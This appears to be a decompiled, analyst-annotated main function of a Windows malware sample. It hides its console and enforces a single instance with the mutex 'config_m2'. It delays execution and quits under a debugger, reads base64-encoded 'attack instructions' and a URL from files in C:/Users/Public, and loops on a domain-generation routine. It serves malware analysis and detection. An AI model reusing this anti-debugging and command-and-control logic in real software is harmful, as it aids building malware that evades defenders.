undefined8 Main(void) {
  DWORD DVar1;
  BOOL BVar2;
  size_t len_of_instructions;
  long curr_stream_pos;
  FILE *win_file_stream;
  byte local_41;
  char *decoded_instructions;
  long file_stream_location;
  FILE *create_config_stream;
  FILE *config_file_stream;
  undefined Debugger_Present;
  HANDLE mutex_config_m2;
  HWND terminal;
  
  FUN_004029d0();
  terminal = GetConsoleWindow();
  ShowWindow(terminal,0);
  mutex_config_m2 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,"config_m2");
  if (mutex_config_m2 == (HANDLE)0x0)
    return 1;
  DVar1 = GetLastError();
  if (DVar1 == 0xb7) {
    CloseHandle(mutex_config_m2);
    return 0;
  }
  Sleep(900000);
  BVar2 = IsDebuggerPresent();
  Debugger_Present = BVar2 != 0;
  if ((bool)Debugger_Present) {
    CloseHandle(mutex_config_m2);
    exit(0);
  }
  config_file_stream = fopen("C://Users//Public//config.ini","r");
  if (config_file_stream == (FILE *)0x0) {
    create_config_stream = fopen("C://Users//Public//config.ini","w");
    fclose(create_config_stream);
  }
  else {
    fgets(&Attack_Instructions,0x32,config_file_stream);
    fseek(config_file_stream,0,2);
    file_stream_location = ftell(config_file_stream);
    fclose(config_file_stream);
    if (file_stream_location != 0) {
      len_of_instructions = strlen(&Attack_Instructions);
      decoded_instructions = (char *)Base64_Decoding(0x4099c0,len_of_instructions,&len_of_instructions);
      if ((decoded_instructions == (char *)0x0) || (local_41 = FUN_00402265(decoded_instructions), local_41 != 0))
	      goto Domain_Generation;
    }
  }
  win_file_stream = fopen("C://Users//Public//Documents//win.ini","r");
  if (win_file_stream == (FILE *)0x0) {
    win_file_stream = fopen("C://Users//Public//Documents//win.ini","w");
    fclose(win_file_stream);
  }
  else {
    fgets((char *)&URL,0x19,win_file_stream);
    fseek(win_file_stream,0,2);
    curr_stream_pos = ftell(win_file_stream);
    fclose(win_file_stream);
    if (curr_stream_pos != 0)
      Win_ini_Configuration();
  }
Domain_Generation:
  do {
    Sleep(900000);
    Domain_Creation();
    Win_ini_Configuration();
  } while( true );
}
